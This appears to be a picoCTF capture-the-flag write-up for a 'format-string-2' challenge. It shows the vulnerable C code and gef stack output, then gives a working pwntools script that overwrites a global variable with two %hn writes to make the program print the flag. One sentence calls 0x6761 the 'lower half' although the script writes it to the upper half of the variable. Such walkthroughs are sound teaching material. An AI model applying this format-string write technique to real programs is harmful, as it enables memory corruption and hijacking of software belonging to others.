### Challenge Description
---
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

From the description, we now have to change data on the stack, meaning we'll write onto it. 

```
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf); // format string bug here
  printf("\n"); 
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
```
We can use %n to change ``` sus ``` variable to ``` 0x67616c66 ```. Because there is no PIE here, we can use the ``` sus ``` address directly. 
```
gef➤  p &sus
$1 = (<data variable, no debug info> *) 0x404060 <sus>
```
Then, observe the stack before ``` printf(buf); ```.

```
0x00007fffffffd860│+0x0000: 0x00007ffff7fcb7b0  →  0x000e001100000243    ← $rsp
0x00007fffffffd868│+0x0008: 0x00007ffff7ffdab0  →  0x00007ffff7fcb000  →  0x03010102464c457f
  ...
0x00007fffffffd898│+0x0038: 0x00007ffff7fcbca8  →  0x0000000000031fe8
0x00007fffffffd8a0│+0x0040: "aaaaaaaa"   ← $rdi
```
To modify the value at 0x404060 <sus> using a format string vulnerability, we first bring the address onto the stack and prepare to write to it.
The target value, 0x67616c66, is a large number, making it impractical to write directly. 
To address this, we divide the number into two smaller parts for sequential writing.

It's important to note that these two parts must be written in ascending order. 
Specifically, we will first construct a payload to write the lower half, 0x6761. Once this is done, we can proceed with the second part to complete the modification. 
Below is my script:

```
#!/usr/bin/python3

from pwn import *

# r = process('./format-string-2')
r = remote('rhea.picoctf.net', 61179)

sus_addr = 0x404060

payload = f'%{0x6761}c%18$hn'.encode()
payload += f'%{0x6c66 - 0x6761}c%19$hn'.encode()
payload = payload.ljust(32, b'a')
payload += p64(sus_addr + 2)
payload += p64(sus_addr)

r.sendlineafter(b'say?\n', payload)

r.interactive()
```



